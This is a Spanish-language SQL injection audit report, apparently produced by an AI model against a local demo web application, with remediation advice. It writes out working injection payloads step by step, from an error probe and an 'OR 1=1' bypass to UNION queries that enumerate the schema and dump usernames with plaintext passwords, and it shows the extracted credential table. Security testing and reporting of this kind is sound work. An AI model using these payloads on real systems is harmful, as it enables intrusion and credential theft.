# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-30 15:44:21 UTC  
**Modelo:** claude-sonnet-4.6  
**Tipo de vulnerabilidad:** SQL Injection (UNION-based / Error-based)

---

## 1. Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de **SQL Injection** en el parámetro `id` de la aplicación web `http://web.dev.local:8083`. La vulnerabilidad permite a un atacante extraer información sensible de la base de datos, incluyendo credenciales de usuarios.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | SQL Injection (In-band: Error-based + UNION-based) |
| **Parámetro afectado** | `id` (GET) |
| **URL afectada** | `http://web.dev.local:8083/?id=<payload>&Submit=Submit` |
| **CVSS v3** | 9.8 (Crítico) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

---

## 3. Evidencia de Explotación

### 3.1 Confirmación de Error SQL (Error-based)

**Payload:** `1'`  
**Respuesta del servidor:**
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax;
check the manual that corresponds to your MariaDB server version for the right
syntax to use near ''1''' at line 1 in /var/www/html/low.php:11
```
El servidor devuelve errores SQL detallados, confirmando la inyección y revelando la ruta del fichero `/var/www/html/low.php`.

---

### 3.2 Bypass de Autenticación / Extracción Masiva (Boolean-based)

**Payload:** `1' OR '1'='1`  
**Resultado:** Devuelve todos los registros de la tabla de usuarios:
- John Doe
- Jane Smith
- Bob Johnson
- Alice Williams
- Charlie Brown
- Diana Davis
- Eve Miller
- Frank Wilson

---

### 3.3 UNION-based SQLi - Enumeración de la Base de Datos

**Payload:** `0' UNION SELECT database(),user()-- -`  
**Resultado:**
```
Base de datos activa: sqli_demo
Usuario de BD: root@172.18.0.3
```

---

### 3.4 UNION-based SQLi - Enumeración de Tablas

**Payload:** `0' UNION SELECT group_concat(table_name),2 FROM information_schema.tables WHERE table_schema=database()-- -`  
**Resultado:**
```
Tablas: users
```

---

### 3.5 UNION-based SQLi - Enumeración de Columnas

**Payload:** `0' UNION SELECT group_concat(column_name),2 FROM information_schema.columns WHERE table_name='users'-- -`  
**Resultado:**
```
Columnas: user_id, first_name, last_name, username, password, email
```

---

### 3.6 Extracción de Credenciales

**Payload:** `0' UNION SELECT group_concat(username,0x3a,password SEPARATOR 0x7c),2 FROM users-- -`  
**Resultado - Credenciales extraídas:**

| Usuario | Contraseña |
|---------|-----------|
| admin | password123 |
| jsmith | secret456 |
| bjohnson | mypass789 |
| awilliams | qwerty123 |
| cbrown | password |
| ddavis | secure123 |
| emiller | hackme |
| fwilson | admin123 |

> ⚠️ Las contraseñas se almacenan en **texto plano** (sin hash), lo que agrava la criticidad de la vulnerabilidad.

---

## 4. Análisis Técnico

El código vulnerable se ubica en `/var/www/html/low.php` (línea 11). La consulta SQL probablemente construye la query concatenando directamente el parámetro `id` sin sanitización:

```php
// Código vulnerable (hipotético basado en la evidencia)
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysqli_query($conn, $query);
```

La falta de uso de **prepared statements** o **consultas parametrizadas** permite la inyección de código SQL arbitrario.

---

## 5. Impacto

- **Confidencialidad:** ALTA - Extracción completa de la base de datos, incluyendo credenciales.
- **Integridad:** ALTA - Posibilidad de modificar o eliminar datos.
- **Disponibilidad:** MEDIA - Posibilidad de ejecutar operaciones destructivas.
- **Alcance adicional:** El usuario de BD es `root`, lo que podría permitir acceso a otras bases de datos del servidor.

---

## 6. Recomendaciones

1. **Usar Prepared Statements / Consultas Parametrizadas:**
   ```php
   $stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
   $stmt->bind_param("i", $id);
   $stmt->execute();
   ```

2. **Validar y sanitizar entradas:** Verificar que el parámetro `id` sea un entero válido antes de usarlo.

3. **Principio de mínimo privilegio:** El usuario de base de datos de la aplicación no debe ser `root`. Crear un usuario con permisos mínimos (solo SELECT sobre las tablas necesarias).

4. **Almacenamiento seguro de contraseñas:** Usar funciones de hash seguras como `password_hash()` con `PASSWORD_BCRYPT` en PHP.

5. **Deshabilitar mensajes de error detallados en producción:** Configurar `display_errors = Off` y registrar errores en logs internos.

6. **Implementar WAF (Web Application Firewall):** Como medida adicional de defensa en profundidad.

---

## 7. Conclusión

La aplicación presenta una vulnerabilidad crítica de SQL Injection que permite la extracción completa de la base de datos `sqli_demo`, incluyendo credenciales de 8 usuarios en texto plano. La explotación es trivial y no requiere autenticación previa. Se recomienda remediar de forma inmediata implementando consultas parametrizadas y aplicando las demás recomendaciones descritas.

---

*Informe generado automáticamente por análisis de seguridad autorizado.*
